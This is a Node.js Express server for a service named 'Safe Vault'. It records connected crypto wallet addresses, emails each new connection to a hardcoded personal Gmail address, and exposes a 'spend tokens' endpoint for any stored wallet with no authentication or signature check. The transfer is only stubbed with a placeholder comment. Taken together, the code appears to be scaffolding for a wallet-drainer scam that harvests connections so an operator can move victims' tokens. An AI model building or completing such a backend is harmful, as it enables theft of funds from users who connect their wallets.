const express = require('express');
const cors = require('cors');
require('dotenv').config();

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// In-memory storage for wallets
let connectedWallets = [];

// Test endpoint
app.get('/', (req, res) => {
  res.json({ message: 'Safe Vault Backend is running!' });
});

// Get all wallets
app.get('/api/wallets', (req, res) => {
  try {
    res.json({
      success: true,
      wallets: connectedWallets
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Connect wallet
app.post('/api/wallet/connect', (req, res) => {
  try {
    const { walletAddress, chainId, signature, message } = req.body;

    if (!walletAddress || !chainId) {
      return res.status(400).json({
        success: false,
        error: 'Missing wallet address or chain ID'
      });
    }

    // Store wallet
    const wallet = {
      address: walletAddress,
      chainId: chainId,
      connectedAt: new Date(),
      status: 'connected'
    };

    connectedWallets.push(wallet);

    // Send email notification
    sendEmailNotification(walletAddress, chainId).catch(err => {
      console.error('Email error:', err);
    });

    res.json({
      success: true,
      message: 'Wallet connected',
      wallet: wallet
    });

  } catch (error) {
    console.error('Connect error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Disconnect wallet
app.post('/api/wallet/disconnect', (req, res) => {
  try {
    const { walletAddress } = req.body;

    connectedWallets = connectedWallets.filter(w =>
      w.address.toLowerCase() !== walletAddress.toLowerCase()
    );

    res.json({
      success: true,
      message: 'Wallet disconnected'
    });

  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Spend tokens endpoint
app.post('/api/wallet/spend', (req, res) => {
  try {
    const { walletAddress, chainId } = req.body;

    const wallet = connectedWallets.find(w =>
      w.address.toLowerCase() === walletAddress.toLowerCase()
    );

    if (!wallet) {
      return res.status(404).json({
        success: false,
        error: 'Wallet not found'
      });
    }

    // Here you would call the smart contract
    // For now, just return success
    res.json({
      success: true,
      message: 'Tokens transferred',
      walletAddress: walletAddress,
      chainId: chainId
    });

  } catch (error) {
    console.error('Spend error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Send email notification
async function sendEmailNotification(walletAddress, chainId) {
  try {
    const nodemailer = require('nodemailer');

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'your-email@gmail.com', // Change this
        pass: process.env.GMAIL_PASSWORD || 'your-app-password' // Use app password
      }
    });

    const chainName = chainId === 1 ? 'Ethereum' : chainId === 137 ? 'Polygon' : 'BSC';

    const mailOptions = {
      from: 'Safe Vault <your-email@gmail.com>',
      to: process.env.NOTIFICATION_EMAIL || 'Kkdabby76@gmail.com',
      subject: `🔔 New Wallet Connected - ${walletAddress}`,
      html: `
        <h2>Wallet Connected to Safe Vault</h2>
        <p><strong>Wallet Address:</strong> ${walletAddress}</p>
        <p><strong>Network:</strong> ${chainName} (Chain ID: ${chainId})</p>
        <p><strong>Connected At:</strong> ${new Date().toLocaleString()}</p>
        <br>
        <p>Log in to your Safe Vault dashboard to manage this wallet.</p>
      `
    };

    await transporter.sendMail(mailOptions);
    console.log(`✅ Email sent for wallet: ${walletAddress}`);

  } catch (error) {
    console.error('Email send error:', error);
    // Don't throw - email failure shouldn't break the API
  }
}

// Error handling
app.use((err, req, res, next) => {
  console.error('Error:', err);
  res.status(500).json({
    success: false,
    error: err.message
  });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Safe Vault Backend running on port ${PORT}`);
});
